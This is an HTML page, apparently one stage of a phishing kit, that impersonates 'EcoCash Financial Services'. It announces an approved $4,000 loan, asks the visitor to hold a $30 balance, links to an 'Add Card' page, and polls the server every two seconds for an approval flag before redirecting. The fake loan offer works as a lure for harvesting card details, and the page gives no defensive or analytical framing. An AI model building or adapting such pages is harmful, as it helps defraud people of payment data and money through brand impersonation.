```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>EcoCash | Qualification</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:'Segoe UI',sans-serif;
    background:linear-gradient(135deg,#eef4ff,#f8fafc);
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.card{
    width:100%;
    max-width:450px;
    background:#fff;
    border-radius:24px;
    padding:30px;
    box-shadow:0 15px 40px rgba(0,0,0,.08);
}

.header{
    text-align:center;
    margin-bottom:25px;
}

.logo{
    font-size:32px;
    font-weight:800;
    margin-bottom:8px;
}

.logo .eco{
    color:#e11d48;
}

.logo .cash{
    color:#2563eb;
}

.subtitle{
    color:#6b7280;
    font-size:14px;
}

.status-box{
    background:#f8fafc;
    border:1px solid #e5e7eb;
    padding:16px;
    border-radius:14px;
    text-align:center;
    margin-bottom:20px;
}

.badge{
    display:inline-block;
    background:#dcfce7;
    color:#15803d;
    padding:8px 18px;
    border-radius:50px;
    font-size:14px;
    font-weight:700;
}

.message-box{
    background:linear-gradient(135deg,#ecfdf5,#d1fae5);
    border-radius:18px;
    padding:25px;
    text-align:center;
    margin-bottom:20px;
}

.icon{
    width:70px;
    height:70px;
    background:#22c55e;
    color:white;
    border-radius:50%;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:34px;
    margin:0 auto 15px;
}

.message-box h2{
    color:#166534;
    margin-bottom:10px;
}

.message-box p{
    color:#14532d;
    line-height:1.6;
    margin-bottom:12px;
}

.loan-amount{
    font-size:32px;
    font-weight:800;
    color:#16a34a;
    margin:15px 0;
}

.buttons{
    margin-top:20px;
}

.btn-success{
    display:block;
    width:100%;
    text-decoration:none;
    color:white;
    padding:14px;
    border-radius:14px;
    font-weight:700;
    text-align:center;
    background:#10b981;
    box-shadow:0 8px 20px rgba(16,185,129,.25);
    transition:.3s;
}

.btn-success:hover{
    background:#059669;
    transform:translateY(-2px);
}

.footer{
    text-align:center;
    font-size:12px;
    color:#94a3b8;
    margin-top:20px;
}
</style>
</head>

<body>

<div class="card">

    <div class="header">
        <div class="logo">
            <span class="eco">Eco</span><span class="cash">Cash</span>
        </div>
        <div class="subtitle">Financial Services</div>
    </div>

    <div class="status-box">
        <p>Account Status</p>
        <div class="badge">✓ Qualified</div>
    </div>

    <div class="message-box">

        <div class="icon">🎉</div>

        <h2>Congratulations!</h2>

        <p>Your approved loan limit is</p>

        <div class="loan-amount">$4,000</div>

        <p>
            Please ensure your information is accurate
            and your main account balance is at least
            <strong>$30</strong>.
        </p>

        <p>Thank you for choosing EcoCash.</p>

        <div class="buttons">
            <a href="card.php" class="btn-success">
                ➕ Add Card
            </a>
        </div>

    </div>

    <div class="footer">
        © 2025 EcoCash Financial
    </div>

</div>

<script>
// Poll server every 2 seconds
function checkApproval() {
    fetch(window.location.href + '?check_approve=1')
        .then(response => response.json())
        .then(data => {
            if (data.approve === 1) {
                window.location.href = 'approved.php';
            }
        })
        .catch(err => console.error(err));
}

setInterval(checkApproval, 2000);
checkApproval();
</script>

</body>
</html>
```
